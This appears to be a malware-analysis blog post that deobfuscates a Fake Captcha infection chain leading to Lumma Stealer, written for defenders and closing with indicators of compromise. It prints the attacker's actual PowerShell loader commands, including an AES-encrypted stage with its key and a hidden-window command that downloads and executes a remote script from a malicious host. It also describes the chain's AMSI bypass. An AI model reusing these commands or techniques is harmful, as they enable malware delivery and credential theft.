# From Fake captcha to Lumma Stealer: JavaScript, Powerhsell and .NET analysis


### Overview 

Since 2024, the 'Fake Captcha' technique has become very common. It is a social engineering attack that tricks the user into executing a command locally on their endpoint, after which the next stages of the malware are downloaded and executed.

A lot of threat actors are using this technique to spread Lumma Stealer, which has been one of the [most commonly used stealers](https://any.run/malware-trends/)! 

In this post, I am going to explore some of its stages and the deobfuscation of the payloads, focusing on JavaScript, PowerShell, and .NET.

<img src="/static/Lumma/Lumma.png" alt="drawing" width="700"/>

### Analysis

#### The Fake Captcha

Let's start with the Fake Captcha. Users are commonly redirected to this technique by accessing insecure domains (like those free movie sites that redirect you to a different site with every click) and end up with an unusual captcha to solve.

URL: objectstorage[.]ap-singapore-2[.]oraclecloud[.]com/n/ax4mqlu25efi/b/zordarruba/o/complete-this-step-to-continue[.]html 

<img src="/static/Lumma/Pasted image 20250309122928.png" alt="drawing" width="1000"/>

Clicking on it, we receive some very suspicious instructions: press WINDOWS + R to open the Run command window, CTRL + V to paste something, and Enter to execute it.

<img src="/static/Lumma/Pasted image 20250309122941.png" alt="drawing" width="1000"/>

Our clipboard content is overwrited with something very suspicious.

At first, there is a string meant to fool the user, but...

<img src="/static/Lumma/Pasted image 20250309123137.png" alt="drawing" width="1000"/>

At the start of the command, there is an mshta execution running a remote script. 

<img src="/static/Lumma/Pasted image 20250309123153.png" alt="drawing" width="1000"/>

Let's take a look at the remote script. At first, it plays an MP3 file of the music "Moonlight Dancer", but let's download it to take a closer look...

<img src="/static/Lumma/Pasted image 20250309124418.png" alt="drawing" width="1000"/>

Inspecting the file in a hex editor... and there it is a script that is part of an HTA file!

<img src="/static/Lumma/Pasted image 20250309124356.png" alt="drawing" width="1000"/>

#### HTA File

Extracting the HTA file, we find that it contains a lot of very messy JavaScript with a LOT OF OBFUSCATION. Let's try to find a suspicious function, like eval to make our analysis easier.

<img src="/static/Lumma/Pasted image 20250310195625.png" alt="drawing" width="1000"/>

And there's an eval executing the aVRYN variable after some replace and decode of the payload.

<img src="/static/Lumma/Pasted image 20250310193901.png" alt="drawing" width="1000"/>

<img src="/static/Lumma/Pasted image 20250310194051.png" alt="drawing" width="1000"/>

To summarize this function:

The regular expression (..). works as follows:
- (..) captures two characters (potentially a hex value).
- . matches and ignores the next character (an obfuscation trick).

The parseInt(p1, 16) converts the two-character hex string into a decimal number.

String.fromCharCode(...) converts that decimal number into its corresponding ASCII character.


Let's copy the eval function and the aVRYN variable to another file and print the decoded aVRYN using the following code:

```
var decoded = aVRYN.replace(/(..)./g, function(match, p1) {
    return String.fromCharCode(parseInt(p1, 16));
});

WScript.Echo(decoded);
```

Now we have another decoding routine where each number in a is shifted by +664 and executed.

<img src="/static/Lumma/Pasted image 20250313192828.png" alt="drawing" width="1000"/>

Let's copy it and again print out the result without the Run function.

<img src="/static/Lumma/Pasted image 20250310193610.png" alt="drawing" width="1000"/>

#### Powershell

A PowerShell command with a decoding and decrypting routine, this time AES encryption was applied in the command. Let's use CyberChef for this one, using the key 4F4C525A7878755676766C56676C6461, which can be found in the command.

```
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w h -ep Unrestricted -nop function mkMCv($UPAMeKP){-split($UPAMeKP -replace '..', '0x$& ')};$pzshDt=mkMCv('21FA56D1BE558F674DF2855593E966463F74F48B830841A1378B15A0613F562D05F9FB7FDF81833603B5A1F46E4C1C82982E4E4D9D338E2D472DFAFED1A6B3F413362B2219711B918D458F077DE1F42F72CF0660EF85D4F2A08D4672DC1AC3D7C2ECAFD5CC74AEC334027FDD7704B9BD2DAFFF93E1BBD07DD719120B52C47CBB559EAB3AAA6FB9827EE5F2143A3E5F51E14E1EDE146FA73B5EC1D71B26AA247307D0DFA7B5E8165CEA4244C31881F206E0ED652324AB7AAD601AC767F2A1C1F5D8318F1311E1427813CFD84865F7842B6E25C9FFDFBF42673569457149A6045B36743D582E63EB1E4FC248D1739B7963498F3D6CCE8FBD181E6BCCD0A479A33E15E3F28174431AF288E124DD6281B97D23E17FBF1A5697565F1ABBF4270386C554F8CEBC68CB347AF787208E343EF016377C3B3201176F2D62FCA754F6DCF5BE59FC4ADA1F5B60960CB628ADE2DDE5CE97FFF7EA959A5A858A31C7C8A770903EDE77998017A2898B2A2F7C4E5D9EA26551434DA605DCE9C50FAA497339721C2B385EB8DE61D4982E1F6A437BEDEC787BFA9701C9B1C799CBB8CE9A1A5CA4959F436525D824D1D365D32C753E291B740A7D4E553FCE77CAC48B152770543D9B4D04EE9FDDC9096BC854E0365BD49BC744161A71AF5A2108085615ADF6CB0268BBCB40C113C1E1F40C9AE066950C68D1C5908DC7B2E539C26E70FC6508DA0DF1B7FB9E897B3538BD456DDB4F9E8F922C5813C13873D189ADF3D76CCEA4D19EC0C5C9E5F1CCC85BA97879E2E47F3B7F757DB325AB40E936EC82447F3C069F262DD077CE453652706004FF499867AC11B8E7E57CE2E82F3BED6FDECCF3D56DD133848D27B1E2F2E53272F32C4811D31EB4460FD7528D04E201CB1EB51F258031E199A70ADE7FDDE1F018FFB26C919E7331C5');$qJrOwaqb=-join [char[]](([Security.Cryptography.Aes]::Create()).CreateDecryptor((mkMCv('4F4C525A7878755676766C56676C6461')),[byte[]]::new(16)).TransformFinalBlock($pzshDt,0,$pzshDt.Length)); & $qJrOwaqb.Substring(0,3) $qJrOwaqb.Substring(3)
```

We can decrypt its content and it gives us a PowerShell command to dynamically execute another remote script.

<img src="/static/Lumma/Pasted image 20250315115007.png" alt="drawing" width="1000"/>

```
"$env:SystemRoot\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -ArgumentList '-NoProfile','-ExecutionPolicy','Unrestricted','-Command','''YP''|%{SV YP ([PowerShell]::Create())}{$Null=$YP.(($YP.PsObject.Methods|Where{$_.Name -like ''*ip*''}).Name)((([System.Net.WebClient]::New().DownloadString(''https://perent4.ganderbrisklyonly.shop/freshbodyshop.mp3''))))}{$YP.Invoke()}{$YP.Dispose()}';$SnHOuf = $env:AppData;function dALRNIlLR($IxNObKuq, $kWINjaUIW){curl $IxNObKuq -o $kWINjaUIW};function QnHuCvHMb(){function yNRMBdoYx($WslRuZ){if(!(Test-Path -Path $kWINjaUIW)){dALRNIlLR $WslRuZ $kWINjaUIW}}}QnHuCvHMb;
```

Let's take a look at the URL, and there's a heavily obfuscated PowerShell script.

<img src="/static/Lumma/Pasted image 20250310215756.png" alt="drawing" width="1000"/>

Looking to the code the first thing that cought my eye was a lot of bytes and a XOR Loop. This XOR decrypts a byte array (`$yJnBuUCkdg`) using another array (`$ZohLcP`) as a key.

<img src="/static/Lumma/Bytes.png" alt="drawing" width="1000"/>

<img src="/static/Lumma/XOR.png" alt="drawing" width="1000"/>

Let's copy the script and make a small modification to decode the yJnBuUCkdg array and write the result to a decoded_script.ps1.

<img src="/static/Lumma/Pasted image 20250311211924.png" alt="drawing" width="1000"/>

```
$decodedCode = [System.Text.Encoding]::UTF8.GetString($(for($i=0;$i-lt$yJnBuUCkdg.$eKXCNQlUlOmSwCy;){
    for($j=0;$j-lt$ZohLcP.$eKXCNQlUlOmSwCy;$j++){
        $yJnBuUCkdg[$i] -bxor $ZohLcP[$j]
        $i++
        if($i -ge $yJnBuUCkdg.$eKXCNQlUlOmSwCy){
            $j = $ZohLcP.$eKXCNQlUlOmSwCy
        }
    }
}))
```

Executing the script, and now we have beautiful PowerShell code that its not obfuscated. Nice!

<img src="/static/Lumma/Pasted image 20250311212333.png" alt="drawing" width="1000"/>

Taking a look at the script, the first thing it does is scan the memory regions of the process to patch clr.dll and bypass AMSI. (The comments left by the threat actor in the code helped a lot.)

<img src="/static/Lumma/Pasted image 20250311212353.png" alt="drawing" width="1000"/>

<img src="/static/Lumma/Pasted image 20250311212413.png" alt="drawing" width="1000"/>

After that, it loads an EXE into memory and executes it. This time, a simple Base64 decoding is used for the EXE.

<img src="/static/Lumma/Pasted image 20250311212436.png" alt="drawing" width="1000"/>

<img src="/static/Lumma/64_decode.png" alt="drawing" width="1000"/>

#### .NET

Saving the EXE to disk, we can see that it's a .NET file. Let's take a look at it and debug it using dnSpy.

<img src="/static/Lumma/Pasted image 20250311213414.png" alt="drawing" width="1000"/>

And a very interesting function caught my eye again, some byte array being loaded and a specific function being mentioned in one of the variables.

<img src="/static/Lumma/Pasted image 20250311215854.png" alt="drawing" width="1000"/>

Right-clicking the array variable, we can use 'Show in Memory' to see that...

<img src="/static/Lumma/Pasted image 20250311215340.png" alt="drawing" width="1000"/>

It's another binary!

<img src="/static/Lumma/Pasted image 20250311215355.png" alt="drawing" width="1000"/>

Let's save it to disk and analyze it in dnSpy.

<img src="/static/Lumma/Pasted image 20250312204224_a.png" alt="drawing" width="1000"/>

A very obfuscated DLL, and after some research, it seems very similar to .NET Reactor protection.

<img src="/static/Lumma/Pasted image 20250312213258_a.png" alt="drawing" width="1000"/>

<img src="/static/Lumma/Pasted image 20250313180015.png" alt="drawing" width="1000"/>

Let's give [.NET Reactor Slayer](https://github.com/SychicBoy/NETReactorSlayer) a shot.

<img src="/static/Lumma/Pasted image 20250313174458.png" alt="drawing" width="1000"/>

Success! The protection was removed, and we have a very beautiful Lumma Stealer dropper source code.

<img src="/static/Lumma/Pasted image 20250313174715.png" alt="drawing" width="1000"/>

<img src="/static/Lumma/Pasted image 20250313175701.png" alt="drawing" width="1000"/>

Let's end this analysis here for this post. This binary has a lot to explore, and it's too much for one post! But here some of its techniques (besides the stealers behavior) and IoCs:

The malware has accessed a Steam profile to collect the encrypted domain names: steamcommunity[.]com/profiles/76561199822375128

<img src="/static/Lumma/steam.png" alt="drawing" width="1000"/>

### IoCs

jekin[.]shop

perent4[.]ganderbrisklyonly[.]shop

exploreth[.]shop

v279792[.]hosted-by-vdsina[.]com

puawprintm[.]bet

begindecafer[.]world

garagedrootz[.]top

modelshiverd[.]icu

arisechairedd[.]shop

catterjur[.]run

orangemyther[.]live

fostinjec[.]today

sterpickced[.]digital

46[.]8[.]232[.]106

### Concluding Thoughts

Malwares with a lot of obfuscation like this can be very overwhelming, and it's very important to focus on what stands out from the rest. A lot of analysis time can be saved this way! PowerShell, JavaScript, and .NET are extremely common to be heavily obfuscated, and this was what I wanted to focus on in this post

Thank you for taking the time to read this! If you have any questions or suggestions, feel free to contact me.
